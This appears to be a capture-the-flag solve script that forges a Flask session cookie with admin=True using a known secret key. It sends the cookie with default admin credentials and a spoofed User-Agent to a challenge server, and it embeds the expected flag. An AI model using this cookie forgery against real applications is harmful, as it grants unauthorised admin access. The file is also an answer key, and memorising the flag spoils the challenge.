import re
import sys
import requests
import hashlib
from flask import Flask
from itsdangerous import TimestampSigner, URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

HOST = "localhost"
PORT = 9949
FLAG = "magpie{d3l1c10u5_h0m3m4d3_c00k1e5}"

class decodeCookie:
    session = {"admin":True,"username":"mom_pop"}
    def __init__(self):
        pass

    @staticmethod
    def solve():
        s = URLSafeTimedSerializer(
            secret_key='flour_sugar_chocolate_and_lotsalove',
            salt='cookie-session',
            serializer=TaggedJSONSerializer(),
            signer=TimestampSigner,
            signer_kwargs={
                'key_derivation': 'hmac',
                'digest_method': hashlib.sha1
            }
        )
        return s.dumps(decodeCookie.session)

def solve() -> bool:
    newCookie = decodeCookie.solve()

    expected_browser = "Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)"

    s = requests.session()

    response = s.post(f"http://{HOST}:{PORT}", data = {"username" : "admin", "password" : "admin"}, headers = {"User-Agent":expected_browser}, cookies = {"session" : newCookie}).text

    regex = re.search(r'magpie\{(.)+\}', response)

    return FLAG in regex.group(0)

def main():
    global HOST
    global PORT

    if len(sys.argv) != 3:
        print("Usage: ./solve.py <IP> <PORT>")
        sys.exit(1)

    HOST = sys.argv[1]
    PORT = sys.argv[2]

    print(solve())

if __name__ == "__main__": main()
